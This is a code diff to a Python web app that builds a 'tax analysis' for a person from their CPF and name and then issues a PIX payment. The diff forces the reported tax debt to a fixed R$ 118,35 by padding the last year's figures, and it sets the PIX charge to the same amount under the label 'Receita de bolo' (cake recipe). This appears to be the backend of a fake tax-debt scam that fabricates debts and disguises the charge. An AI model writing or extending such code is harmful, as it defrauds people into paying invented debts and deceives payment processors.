@@ -155,12 +155,12 @@ def generate_tax_analysis(cpf, name):
     
     analysis_data['total_devido'] = round(analysis_data['total_devido'], 2)
     
-    # Always ensure total is close to R$ 127,94 for payment consistency
-    adjustment_needed = 127.94 - analysis_data['total_devido']
+    # Always ensure total is close to R$ 118,35 for payment consistency
+    adjustment_needed = 118.35 - analysis_data['total_devido']
     if analysis_data['anos']:
         analysis_data['anos'][-1]['total_ano'] += adjustment_needed
         analysis_data['anos'][-1]['valor_principal'] += adjustment_needed
-        analysis_data['total_devido'] = 127.94
+        analysis_data['total_devido'] = 118.35
     
     return analysis_data
 
@@ -301,8 +301,8 @@ def generate_pix():
         app.logger.info(f"[PROD] Gerando PIX para: {customer_name} (CPF: {customer_cpf[:3]}***{customer_cpf[-2:]})")
         app.logger.info(f"[PROD] Dados recebidos: {json.dumps(data, indent=2)}")
 
-        # Valor fixo de R$ 127,94 (produto: Receita de bolo)
-        amount = 127.94
+        # Valor fixo de R$ 118,35 (produto: Receita de bolo)
+        amount = 118.35
 
         app.logger.info(f"[PROD] Valor do pagamento configurado: R$ {amount:.2f}")
 
